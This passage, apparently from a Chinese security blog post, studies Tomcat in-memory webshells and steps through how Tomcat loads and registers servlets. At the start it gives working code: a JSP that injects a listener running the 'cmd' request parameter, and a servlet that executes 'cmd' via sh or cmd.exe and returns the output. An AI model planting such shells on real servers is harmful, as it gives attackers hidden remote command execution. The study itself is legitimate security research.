class="variable">field1</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext)field1.get(applicationContext);</span><br><span class="line"><span class="comment">//编写恶意listener</span></span><br><span class="line">    <span class="type">ServletRequestListener</span> <span class="variable">badListener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletRequestListener</span>()&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;销毁&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="type">ServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (ServletRequest)sre.getServletRequest();</span><br><span class="line">            <span class="type">String</span> <span class="variable">shell</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(shell != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(shell);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="comment">//注入恶意代码</span></span><br><span class="line">    standardContext.addApplicationEventListener(badListener);</span><br><span class="line"><span class="comment">//提示</span></span><br><span class="line">    out.println(<span class="string">&quot;注入成功&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>还是先访问jsp文件，再请求资源并进行命令执行：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240901201216008.png" alt="image-20240901201216008"></p>
<p>成功执行。</p>
<h4 id="Sevlet型内存马"><a href="#Sevlet型内存马" class="headerlink" title="Sevlet型内存马"></a>Sevlet型内存马</h4><p>同样的以一个简单的servlet来分析一下流程。</p>
<p>web.xml：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ServletTest<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>Servlet.ServletTest<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ServletTest<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/servlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ServletTest.java:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(value = &quot;/servlet&quot;,name = &quot;ServletTest&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletTest</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig var1)</span> <span class="keyword">throws</span> ServletException&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;servlet启动&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">            isLinux = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">        out.println(output);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行一下可以成功进行命令执行：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240902145647422.png" alt="image-20240902145647422"></p>
<p>这里的继承关系：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Interface Servlet, ServletConfig</span><br><span class="line">↓</span><br><span class="line">abstract class GenericServlet</span><br><span class="line">↓</span><br><span class="line">class HttpServlet</span><br><span class="line">↓</span><br><span class="line">自定义 Servlet</span><br></pre></td></tr></table></figure>



<h5 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h5><p>（<u>这里改成了maven项目来学习，将.class文件改为了.java文件</u>）</p>
<h6 id="调试分析servlet的加载过程"><a href="#调试分析servlet的加载过程" class="headerlink" title="调试分析servlet的加载过程"></a>调试分析servlet的加载过程</h6><p>在<code>org.apache.catalins.core.StandardContext</code>类的<code>startInternal()</code>方法中，首先调用了<code>listenerStart()</code>，接着是<code>filterStart()</code>，最后是<code>loadOnstartup()</code>。这三处调用触发了Listener、Filter、Servlet的构造加载。</p>
<p>这里主要分析Servlet的加载，现在打断点于loadOnstartup()方法</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240903122950573.png" alt="image-20240903122950573"></p>
<p>前面也说过了，在Container中的四个容器是存在父子关系的，而StandardContext是Context的实现类，所以这里很有可能这里的findChildren()方法就是寻找wrapper，也就是Sevlet。进入这个findChildren()方法：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240903123019133.png" alt="image-20240903123019133"></p>
<p>进入到了StandardContext类的父类ContainerBase类，children变量的定义为：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240903123114084.png" alt="image-20240903123114084"></p>
<p>children是一个HashMap类实例，这里调用HashMap类的values()方法用来获取到HashMap中的value的集合。看一下这里的输出结果：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240903123307699.png" alt="image-20240903123307699"></p>
<p>这里有三个，一个default和JSP，应该都是自带的，在这里还可以看到我们自定义的ServletTest，基本可以确定这里的children就是存储Servlet的地方。</p>
<p>所以这里的<strong>findChildren()方法就是获取到Servlet的Container类型的数组并返回</strong>。</p>
<p>————</p>
<p>再回到loadOnStartup()方法，方法定义如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">loadOnStartup</span><span class="params">(Container children[])</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Collect &quot;load on startup&quot; servlets that need to be initialized</span></span><br><span class="line">        TreeMap&lt;Integer,ArrayList&lt;Wrapper&gt;&gt; map = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Container child : children) &#123;</span><br><span class="line">            <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper) child;</span><br><span class="line">            <span class="type">int</span> <span class="variable">loadOnStartup</span> <span class="operator">=</span> wrapper.getLoadOnStartup();</span><br><span class="line">            <span class="keyword">if</span> (loadOnStartup &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Integer</span> <span class="variable">key</span> <span class="operator">=</span> Integer.valueOf(loadOnStartup);</span><br><span class="line">            map.computeIfAbsent(key, k -&gt; <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;()).add(wrapper);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Load the collected &quot;load on startup&quot; servlets</span></span><br><span class="line">        <span class="keyword">for</span> (ArrayList&lt;Wrapper&gt; list : map.values()) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Wrapper wrapper : list) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    wrapper.load();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ServletException e) &#123;</span><br><span class="line">                    getLogger().error(</span><br><span class="line">                            sm.getString(<span class="string">&quot;standardContext.loadOnStartup.loadException&quot;</span>, getName(), wrapper.getName()),</span><br><span class="line">                            StandardWrapper.getRootCause(e));</span><br><span class="line">                    <span class="comment">// <span class="doctag">NOTE:</span> load errors (including a servlet that throws</span></span><br><span class="line">                    <span class="comment">// UnavailableException from the init() method) are NOT</span></span><br><span class="line">                    <span class="comment">// fatal to application startup</span></span><br><span class="line">                    <span class="comment">// unless failCtxIfServletStartFails=&quot;true&quot; is specified</span></span><br><span class="line">                    <span class="keyword">if</span> (getComputedFailCtxIfServletStartFails()) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>通读一下，还是比较好看懂的：</p>
<ul>
<li>先定义一个TreeMap类，然后使用for循环遍历传入的children变量，然后对对象调用getLoadOnStartup()方法：</li>
</ul>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240903130437831.png" alt="image-20240903130437831"></p>
<p>也就是直接返回loadOnStartup，如果loadOnStartup &lt; 0，就会直接进行下一个for循环，那么这里的loadOnstartup是什么？</p>
<p>其实就是StandardWrapper类的一个变量，<strong>当是一个负数或者没有指定时，则表示服务器在该servlet被调用时才加载</strong>，我们点开这里的children：</p>
<p>在服务器自带的servlet中为：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240903125643619.png" alt="image-20240903125643619"></p>
<p>在我自定义的Servlet中为：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240903125603936.png" alt="image-20240903125603936"></p>
<p>可以看出如果是我自定义的servlet，那么是肯定不会被加载的。但是这里的loadOnStartup其实是 web.xml 配置 Servlet 时的一个配置：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>并且在StandardWrapper类中还有个设置loadOnStartup值的方法：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240903130737807.png" alt="image-20240903130737807"></p>
<p>————————</p>
<ul>
<li>然后回到loadOnStartup()方法：</li>
</ul>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240903131357513.png" alt="image-20240903131357513"></p>
<p>如果条件允许，则会将这个wrapper放入到一个ArrayList型的map，再然后又调用for循环遍历这个map并调用load()方法加载。</p>
<p>继续跟进这个load()方法：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240903132319618.png" alt="image-20240903132319618"></p>
<p>这里调用了loadServlet()方法：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240903133237852.png" alt="image-20240903133237852"></p>
<p>重点就是我标注出来的东西，这里通过<strong>servletClass变量来装载servlet</strong>，并且这个方法最后就是返回这个servlet。</p>
<p>继续分析这个loadServlet()后续代码：</p>
<p>在后面还执行了一次初始化操作：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240903152933417.png" alt="image-20240903152933417"></p>
<p>注意这里将装载后的servlet传进去了，继续跟进这个initServlet()方法：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240903160859192.png" alt="image-20240903160859192"></p>
<p><strong>会调用servlet的init()方法</strong>，在这里就是自带的DefaultServlet类的init()方法：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240903161500123.png" alt="image-20240903161500123"></p>
<p>完成初始化操作。同样的如果我们自定义的ServletTest可以满足loadOnStartup&gt;&#x3D;0，那么同样的会调用到这个init()方法用于初始化这个servlet。自己试了一下，web.xml改为如下即可：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ServletTest<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>Servlet.ServletTest<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ServletTest<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/servlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以自己调调，亲测可行。</p>
<p>————</p>
<p>在调用完init()方法后，还有个点说明一下：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240903161818402.png" alt="image-20240903161818402"></p>
<p>后面还有一个将这个instanceInitialized赋值为true的语句。在前面这里的Wrapper的这个值都是false，只有这里才会将其改为true</p>
<p>————</p>
<p>然后继续回到load()方法：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240903143729676.png" alt="image-20240903143729676"></p>
<p>调试了一下</p>
<ul>
<li><strong>第一个if条件</strong>，不会进入，这个也是上面才说明的，有一串代码对其赋值：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240903151529989.png" alt="image-20240903151529989"></li>
</ul>
<p>所以第一个if语句是不会进入的</p>
<ul>
<li><strong>第二个if条件</strong>中的isJspServlet就是判断是不是服务器自带的JSPServlet，不是就不会进入。</li>
</ul>
<p>OK，servlet加载过程分析完毕。</p>
<p>在上面提到了几个重要的点：</p>
<p>- </p>
<ul>
<li>在StardardContext调用findChildren()获取到Containter[]，然后for循环遍历得到wrapper，并对其进行load()操作</li>
<li>在load()操作中，有两个点需要注意，一个是这个wrapper的loadOnStartup需要&gt;&#x3D;0</li>
<li>还有个点就是利用到了servletClass，使用这个方法获取到了相对应的Servlet类</li>
</ul>
<p>——————</p>
<h6 id="调试分析servlet的初始化过程"><a href="#调试分析servlet的初始化过程" class="headerlink" title="调试分析servlet的初始化过程"></a>调试分析servlet的初始化过程</h6><p>在前面其实说明了比如要用到loadOnStartup、servletClass等变量，但是并没有说到怎么对这些变量进行赋值。这个板块主要就是用于解决这个问题。</p>
<p>在 StandardWrapper#setServletClass() 方法处下断点，开始调试：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240903185901178.png" alt="image-20240903185901178"></p>
<p>可以看出在第一次启动时还是先初始化的自带的DefaultServlet，此时的部分调用栈：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240903190017339.png" alt="image-20240903190017339"></p>
<p>我们回溯到ContextConfig#configureContext()方法，简单看看，基本可以看出就是在读取web.xml中的数据：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240903190616385.png" alt="image-20240903190616385"></p>
<p>这里的context定义：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240903193547405.png" alt="image-20240903193547405"></p>
<p>个人理解可以将其看作context实现类StandardContext类的实例。</p>
<p>再看一下其中的一些方法：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240903190309095.png" alt="image-20240903190309095"></p>
<p>可以看出这里就是在整个tomcat初始化过程中对filter和listener的初始化。但这里的重点还是servlet：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240903190959312.png" alt="image-20240903190959312"></p>
<p>这里调用了几个关键函数：createWrapper()、、setServletClass()。先来看createWrapper()方法，在这里打一个断点调试，进入到了StandardContext类的createWrapperr()方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Wrapper <span class="title function_">createWrapper</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (wrapperClass != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                wrapper = (Wrapper) wrapperClass.getConstructor().newInstance();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                ExceptionUtils.handleThrowable(t);</span><br><span class="line">                log.error(sm.getString(<span class="string">&quot;standardContext.createWrapper.error&quot;</span>), t);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            wrapper = <span class="keyword">new</span> <span class="title class_">StandardWrapper</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">synchronized</span> (wrapperLifecyclesLock) &#123;</span><br><span class="line">            <span class="keyword">for</span> (String wrapperLifecycle : wrapperLifecycles) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Class&lt;?&gt; clazz = Class.forName(wrapperLifecycle);</span><br><span class="line">                    <span class="type">LifecycleListener</span> <span class="variable">listener</span> <span class="operator">=</span> (LifecycleListener) clazz.getConstructor().newInstance();</span><br><span class="line">                    wrapper.addLifecycleListener(listener);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                    ExceptionUtils.handleThrowable(t);</span><br><span class="line">                    log.error(sm.getString(<span class="string">&quot;standardContext.createWrapper.listenerError&quot;</span>), t);</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">synchronized</span> (wrapperListenersLock) &#123;</span><br><span class="line">            <span class="keyword">for</span> (String wrapperListener : wrapperListeners) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Class&lt;?&gt; clazz = Class.forName(wrapperListener);</span><br><span class="line">                    <span class="type">ContainerListener</span> <span class="variable">listener</span> <span class="operator">=</span> (ContainerListener) clazz.getConstructor().newInstance();</span><br><span class="line">                    wrapper.addContainerListener(listener);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                    ExceptionUtils.handleThrowable(t);</span><br><span class="line">                    log.error(sm.getString(<span class="string">&quot;standardContext.createWrapper.containerListenerError&quot;</span>), t);</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> wrapper;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>调试一下，会发现这里的wrapper会被赋值为 StandardWrapper 类实例：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240903191921492.png" alt="image-20240903191921492"></p>
<p>返回结果为</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240903191946678.png" alt="image-20240903191946678"></p>
<p>这个方法的重点也就是这个，可以将一个变量赋值为StandardWrapper类实例（其实也就是对应一个Servlet）。</p>
<p>然后给这个wrapper设置内部值：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240903192431695.png" alt="image-20240903192431695"></p>
<p>分别说明一下：</p>
<ul>
<li>调用了setLoadOnStartup()方法设置loadOnStartup变量，</li>
<li>调用setName()将ContainerBase类中的变量name赋值为一个值：</li>
</ul>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240903192943753.png" alt="image-20240903192943753"></p>
<ul>
<li>调用setServletClass()方法设置servletClass变量的值：</li>
</ul>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240903193342916.png" alt="image-20240903193342916"></p>
<p>再继续往后面看：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240903193818443.png" alt="image-20240903193818443"></p>
<p>当程序把这个Wrapper（理解为一个Servlet）设置好了后，将其加入到context的“子容器”中。<strong>重点关注addChild()方法和addServletMappingDecoded()方法</strong>，下面来分别进入看一下：</p>
<p>- </p>
<ul>
<li>addChild()：</li>
</ul>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240903195201588.png" alt="image-20240903195201588"></p>
<p>前面的代码就是判断是不是自带的jspServlet，这里是自带的DefaultSerrvlet，自然不是，重点是下面调用父类ContainerBase的addChild()方法，进入：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240903195650675.png" alt="image-20240903195650675"></p>
<p>会调用addChildInternal()方法：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240903200058116.png" alt="image-20240903200058116"></p>
<p>重点还是如下代码：<br><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240903200132241.png" alt="image-20240903200132241"></p>
<p>先说明一下这里的if条件，这里需要程序对传进去的child使用getName()时的有回显，否则直接丢出异常：</p>
<p><img src="/2024/09/05/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240903204644579.png" alt="image-20240903204644579"></p>
<p>所以在前面说明的setName()函数设置名称还是非常有必要的。</p>
<p>再就是if语句过后，先是给child设置了父类，在下面也可以看到相关值的情况。</p>
<p>然后前面也说过了，这里的children是一个HashMap类实例，所以这里就是调用了put方法放进键值，和前面分析servlet加载流程的findChildren()方法形成闭环。</p>
<ul>
<li>addServletMappingDecoded()：</li>
</ul>
